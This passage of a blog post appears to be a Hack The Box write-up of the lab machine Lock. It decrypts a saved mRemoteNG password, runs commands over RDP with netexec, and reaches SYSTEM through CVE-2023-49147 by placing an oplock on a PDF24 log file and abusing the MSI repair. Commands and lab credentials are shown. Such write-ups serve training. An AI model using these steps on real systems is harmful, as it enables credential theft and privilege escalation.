class="na">InheritVNCSmartSizeMode=</span><span class="s">"false"</span> <span class="na">InheritVNCViewOnly=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUsageMethod=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayHostname=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUseConnectionCredentials=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayUsername=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayPassword=</span><span class="s">"false"</span> <span class="na">InheritRDGatewayDomain=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;/mrng:Connections&gt;</span>
+</code></pre></div></div>
+<p>There’s a connection for Gale.Dekarios to connect to the host Lock over RDP on 3389. The password is stored encrypted.</p>
+<h4 id="decrypt-password">Decrypt Password</h4>
+<p>I showcased multiple ways to decrypt passwords from mRemoteNG back in 2019 in <a href="/2019/09/07/htb-bastion.html#extract-passwords">Bastion</a>, including writing my own Python script to do it. In 2025, there are many public scripts made for this. I’ll grab the <a href="https://github.com/kmahyyg/mremoteng-decrypt">this one</a>, clone it, and run it against the file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>uv run /opt/mremoteng-decrypt/mremoteng_decrypt.py <span class="nt">-rf</span> config.xml 
+<span class="go">Username: Gale.Dekarios
+Hostname: Lock
+Password: ty8wnW9qCKDosXo6 
+</span></code></pre></div></div>
+<h3 id="rdp">RDP</h3>
+<h4 id="netexec">netexec</h4>
+<p><code class="language-plaintext highlighter-rouge">netexec</code> recently added the ability to run commands over RDP:</p>
+<blockquote class="twitter-tweet"><p dir="ltr" lang="en">Wanna see something cool about RDP and NetExec ? <a href="https://t.co/2h2cLwAVlt">pic.twitter.com/2h2cLwAVlt</a></p>— mpgn (@mpgn_x64) <a href="https://twitter.com/mpgn_x64/status/1942293762333397059?ref_src=twsrc%5Etfw">July 7, 2025</a></blockquote>
+<script async="" charset="utf-8" src="https://platform.twitter.com/widgets.js"></script>
+<p>Seems like a fun thing to try here:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec rdp 10.129.234.64 <span class="nt">-u</span> gale.dekarios <span class="nt">-p</span> ty8wnW9qCKDosXo6 <span class="nt">-x</span> <span class="s2">"type C:</span><span class="se">\\</span><span class="s2">users</span><span class="se">\\</span><span class="s2">gale.dekarios</span><span class="se">\\</span><span class="s2">desktop</span><span class="se">\\</span><span class="s2">user.txt"</span>
+<span class="go">[!] Executing remote command via RDP will disconnect the Windows session (not log off) if the targeted user is connected via RDP, do you want to continue ? [Y/n] Y
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             </span><span class="netexec-logmessage">[*]</span><span class="go"> Windows 10 or Windows Server 2016 Build 20348 (name:LOCK) (domain:Lock) (nla:False)
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             </span><span class="netexec-logsuccess">[+]</span><span class="go"> Lock\gale.dekarios:ty8wnW9qCKDosXo6 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go">
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             </span><span class="netexec-logsuccess">[+]</span><span class="go"> Executing command: type C:\users\gale.dekarios\desktop\user.txt with delay 5 seconds
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             </span><span class="netexec-logsuccess">[+]</span><span class="go"> Waiting for clipboard to be ready...
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             </span><span class="netexec-logsuccess">[+]</span><span class="go"> Clipboard is ready, proceeding with command execution
+</span><span class="netexec-protocol">RDP </span><span class="go">        10.129.234.64   3389   LOCK             17e0844a************************
+</span></code></pre></div></div>
+<p>It reads the flag :)</p>
+<h4 id="rdp-session">RDP Session</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">xfreerdp /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:10.129.234.64:3389 +clipboard</code> to get an RDP session, and it works:</p>
+<picture>
+<source srcset="/img/image-20250816131348161.webp" type="image/webp"/>
+<img alt="image-20250816131348161" class="include_image" loading="lazy" src="/img/image-20250816131348161.png"/>
+</picture>
+<p><code class="language-plaintext highlighter-rouge">user.txt</code> is here as well:</p>
+<picture>
+<source srcset="/img/image-20250816131406373.webp" type="image/webp"/>
+<img alt="image-20250816131406373" class="include_image" loading="lazy" src="/img/image-20250816131406373.png"/>
+</picture>
+<h2 id="shell-as-system">Shell as SYSTEM</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>On the desktop there are shortcuts for mRemoteNG and PDF24. Opening mRemoteNG shows no saved connections. I can confirm that by finding the <code class="language-plaintext highlighter-rouge">confCons.xml</code> file:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\gale.dekarios\AppData\Roaming\mRemoteNG&gt; </span><span class="n">cat</span><span class="w"> </span><span class="o">.</span><span class="nx">\confCons.xml</span><span class="w">
+</span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
+<span class="nt">&lt;mrng:Connections</span> <span class="na">xmlns:mrng=</span><span class="s">"http://mremoteng.org"</span> <span class="na">Name=</span><span class="s">"Connections"</span> <span class="na">Export=</span><span class="s">"false"</span> <span class="na">EncryptionEngine=</span><span class="s">"AES"</span> <span class="na">BlockCipherMode=</span><span class="s">"GCM"</span> <span class="na">KdfIterations=</span><span class="s">"1000"</span> <span class="na">FullFileEncryption=</span><span class="s">"false"</span> <span class="na">Protected=</span><span class="s">"cAtqNd+DCe9vkHsFg8e3wxP7d5IkENeUiK+43JVHtRVtkY0EjkGEeA37qeEZFZjcnotghJTMwuKalATtfp7cQX6G"</span> <span class="na">ConfVersion=</span><span class="s">"2.6"</span> <span class="nt">/&gt;</span>
+</code></pre></div></div>
+<p><a href="https://www.pdf24.org/en/">PDF24</a> is a free PDF creation and tools suite. It’s installed in <code class="language-plaintext highlighter-rouge">C:\Program Files</code>:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\Program Files
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         4/15/2025   6:02 PM                Amazon
+d-----        12/27/2023  10:26 AM                Common Files
+d-----        12/27/2023  10:53 AM                Git
+d-----         4/15/2025   5:56 PM                Internet Explorer
+d-----          5/8/2021   1:20 AM                ModifiableWindowsApps
+d-----        12/28/2023  11:24 AM                Mozilla Firefox
+d-----        12/28/2023  11:29 AM                PDF24
+d-----         4/15/2025   5:24 PM                VMware
+d-----        12/28/2023   5:46 AM                Windows Defender
+d-----          8/7/2025   9:02 PM                Windows Defender Advanced Threat Protection
+d-----         4/15/2025   5:56 PM                Windows Mail
+d-----         4/15/2025   5:56 PM                Windows Media Player
+d-----          5/8/2021   2:35 AM                Windows NT
+d-----         4/15/2025   5:56 PM                Windows Photo Viewer
+d-----          5/8/2021   1:34 AM                WindowsPowerShell
+</span></code></pre></div></div>
+<p>There’s a binary <code class="language-plaintext highlighter-rouge">pdf24.exe</code> in that directory, and the version is 11.15.1:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Program Files\PDF24&gt;</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="o">.</span><span class="nx">\pdf24.exe</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="nx">VersionInfo</span><span class="w">
+</span><span class="go">
+VersionInfo : File:             C:\Program Files\PDF24\pdf24.exe
+              InternalName:     PDF24 Backend
+              OriginalFilename: pdf24.exe
+              FileVersion:      11.15.1
+              FileDescription:  PDF24 Backend
+              Product:          PDF24 Creator
+              ProductVersion:   11.15.1
+              Debug:            False
+              Patched:          False
+              PreRelease:       False
+              PrivateBuild:     False
+              SpecialBuild:     False
+              Language:         English (United States)
+</span></code></pre></div></div>
+<h3 id="cve-2023-49147">CVE-2023-49147</h3>
+<h4 id="background">Background</h4>
+<p>PDF24 has a <a href="https://creator.pdf24.org/changelog/en.html#v11.15.2">changelogs page</a>. I’ll look at the versions just after 11.15.1, and find an interesting line in 11.15.2:</p>
+<picture>
+<source srcset="/img/image-20250817063226972.webp" type="image/webp"/>
+<img alt="image-20250817063226972" class="include_image" loading="lazy" src="/img/image-20250817063226972.png"/>
+</picture>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49147">CVE-2023-49147</a> has an official description of:</p>
+<blockquote>
+<p>An issue was discovered in PDF24 Creator 11.14.0. The configuration of the msi installer file was found to produce a visible cmd.exe window when using the repair function of msiexec.exe. This allows an unprivileged local attacker to use a chain of actions (e.g., an oplock on faxPrnInst.log) to open a SYSTEM cmd.exe.</p>
+</blockquote>
+<p>That sounds exactly like something I would like.</p>
+<p>There’s more detail on <a href="https://packetstorm.news/files/id/176206">this Packet Storm post</a>. The issue is that the installer, running as SYSTEM, will call another binary, <code class="language-plaintext highlighter-rouge">pdf24-PrinterInstall.exe</code>, which opens (typically briefly) in a new <code class="language-plaintext highlighter-rouge">cmd.exe</code> window. This program will open and write to a log file (<code class="language-plaintext highlighter-rouge">C:\Program Files\PDF24\faxPrnInst.log</code>).</p>
+<p>If I can create an <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/oplock-overview">oplock</a> on that file, the installer process will hang waiting for access. While that window is exposed, I can abuse it to get another <code class="language-plaintext highlighter-rouge">cmd.exe</code> running as SYSTEM.</p>
+<h4 id="exploit">Exploit</h4>
+<p>I’ll grab a copy of <code class="language-plaintext highlighter-rouge">SetOpLock.exe</code> from the Google Project Zero <a href="https://github.com/googleprojectzero/symboliclink-testing-tools/releases">symboliclink-testing-tools repo</a>. I can copy it from the file explorer in my VM into the RDP session. Now I’ll lock the log file:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\gale.dekarios&gt; </span><span class="o">.</span><span class="n">\SetOpLock.exe</span><span class="w"> </span><span class="s2">"C:\Program Files\PDF24\faxPrnInst.log"</span><span class="w"> </span><span class="nx">r</span><span class="w">
+</span></code></pre></div></div>
+<p>Now the file is locked and won’t be able to be opened.</p>
+<p>There’s no MSI file in <code class="language-plaintext highlighter-rouge">C:\Program Files\PDF24</code>, but there is a hidden <code class="language-plaintext highlighter-rouge">_install</code> directory in the root of the drive:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="nt">-force</span><span class="w">
+</span><span class="go">
+    Directory: C:\
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d--hs-        12/28/2023   6:17 AM                $Recycle.Bin
+d--h--         4/15/2025   5:36 PM                $WinREAgent
+d--hs-         4/15/2025   6:02 PM                Config.Msi
+d--hsl        12/27/2023   6:14 PM                Documents and Settings
+d-----        12/27/2023  11:11 AM                Gitea
+d-----         4/15/2025   5:56 PM                inetpub
+d-----         8/16/2025   9:57 AM                Microsoft
+d-----          5/8/2021   1:20 AM                PerfLogs
+d-r---         4/15/2025   5:24 PM                Program Files
+d-----        12/28/2023  11:24 AM                Program Files (x86)
+d--h--          8/7/2025  10:48 AM                ProgramData
+d--hs-        12/27/2023   6:14 PM                Recovery
+d--hs-        12/27/2023   6:14 PM                System Volume Information
+d-r---        12/28/2023   6:14 AM                Users
+d-----          8/7/2025   9:02 PM                Windows
+d--h--        12/28/2023  11:23 AM                _install
+-a-hs-         8/15/2025  12:55 PM          12288 DumpStack.log.tmp
+-a-hs-         8/15/2025  12:55 PM     1207959552 pagefile.sys
+</span></code></pre></div></div>
+<p>It has the installer:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\_install&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w">
+</span><span class="go">
+    Directory: C:\_install
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi
+-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
+-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
+</span></code></pre></div></div>
+<p>I’ll open that directory in Explorer and double click the installer. I’ll hit next and on the next screen hit “Repair”:</p>
+<picture>
+<source srcset="/img/image-20250817065931687.webp" type="image/webp"/>
+<img alt="image-20250817065931687" class="include_image" loading="lazy" src="/img/image-20250817065931687.png"/>
+</picture>
+<p>On the next screen, “Repair” again. It will pop up and ask about if I want to close PDF24 Backend, and I don’t think it matters what I pick here. I’ll select “Close the applications and attempt to restart them.”.</p>
+<p>Alternatively, I can also run:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\_install&gt;</span><span class="w"> </span><span class="n">msiexec.exe</span><span class="w"> </span><span class="nx">/fa</span><span class="w"> </span><span class="o">.</span><span class="nx">\pdf24-creator-11.15.1-x64.msi</span><span class="w">
+</span></code></pre></div></div>
+<p>Towards the end of the repair, it will pop open a window running <code class="language-plaintext highlighter-rouge">pdf24-PrinterInstall.exe</code> which just hangs:</p>
+<picture>
+<source srcset="/img/image-20250817065216887.webp" type="image/webp"/>
+<img alt="image-20250817065216887" class="include_image" loading="lazy" src="/img/image-20250817065216887.png"/>
+</picture>
+<p>I’ll right-click on the top bar:</p>
+<picture>
+<source srcset="/img/image-20250817065254204.webp" type="image/webp"/>
+<img alt="image-20250817065254204" class="include_image" loading="lazy" src="/img/image-20250817065254204.png"/>
+</picture>
+<p>On selecting Properties, the next box has the configuration for <code class="language-plaintext highlighter-rouge">cmd.exe</code>:</p>
+<picture>
+<source srcset="/img/image-20250817065407603.webp" type="image/webp"/>
+<img alt="image-20250817065407603" class="include_image" loading="lazy" src="/img/image-20250817065407603.png"/>
+</picture>
+<p>I’ll click the link for “legacy console mode” at the bottom. It pops up asking how to open it:</p>
+<picture>
+<source srcset="/img/image-20250817065440969.webp" type="image/webp"/>
+<img alt="image-20250817065440969" class="include_image" loading="lazy" src="/img/image-20250817065440969.png"/>
+</picture>
+<p>I need to select something that isn’t IE or Edge, so Firefox. This opens Firefox (running as SYSTEM):</p>
+<picture>
+<source srcset="/img/image-20250817065541550.webp" type="image/webp"/>
+<img alt="image-20250817065541550" class="include_image" loading="lazy" src="/img/image-20250817065541550.png"/>
+</picture>
+<p>Ctrl-o will open the open dialog, where I’ll enter “cmd.exe” in the top bar:</p>
+<picture>
+<source srcset="/img/image-20250817065624409.webp" type="image/webp"/>
+<img alt="image-20250817065624409" class="include_image" loading="lazy" src="/img/image-20250817065624409.png"/>
+</picture>
+<p>On hitting enter, it opens a terminal running as SYSTEM:</p>
+<picture>
+<source srcset="/img/image-20250817065706679.webp" type="image/webp"/>
+<img alt="image-20250817065706679" class="include_image" loading="lazy" src="/img/image-20250817065706679.png"/>
+</picture>
+<p>I’ll grab the root flag:</p>
+<div class="language-console windows-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\Administrator\Desktop&gt;</span><span class="nb">type </span>root.txt
+<span class="go">7302e2f3************************
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2025/08/21/htb-lock.html"></a>
+</article>
